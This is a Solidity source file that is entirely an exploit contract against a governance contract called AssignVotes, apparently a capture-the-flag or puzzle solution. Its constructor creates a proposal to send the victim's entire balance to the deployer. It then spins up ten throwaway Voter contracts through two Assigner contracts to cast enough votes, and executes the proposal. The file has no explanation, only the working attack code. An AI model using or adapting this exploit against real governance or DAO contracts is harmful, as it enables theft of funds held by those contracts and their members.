// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

interface IAssignVotes {
    function proposalCounter() external returns (uint256);

    function createProposal(address target, bytes calldata data, uint256 value) external;

    function execute(uint256 proposal) external;

    function assign(address _voter) external;

    function vote(uint256 proposal) external;
}

contract AssignVotesAttacker {
    constructor(IAssignVotes victim) {
        uint256 amount = address(victim).balance;
        uint256 proposal = victim.proposalCounter();
        victim.createProposal(msg.sender, "", amount);
        for (uint256 i; i < 2; ) {
            Assigner assigner = new Assigner();
            assigner.batchAssignAndVote(victim, proposal);
            unchecked {
                ++i;
            }
        }
        victim.execute(proposal);
    }
}

contract Assigner {
    function batchAssignAndVote(IAssignVotes victim, uint256 proposal) public {
        for (uint256 i; i < 5; ) {
            Voter voter = new Voter();
            victim.assign(address(voter));
            voter.vote(victim, proposal);
            unchecked {
                ++i;
            }
        }
    }
}

contract Voter {
    function vote(IAssignVotes victim, uint256 proposal) public {
        victim.vote(proposal);
    }
}
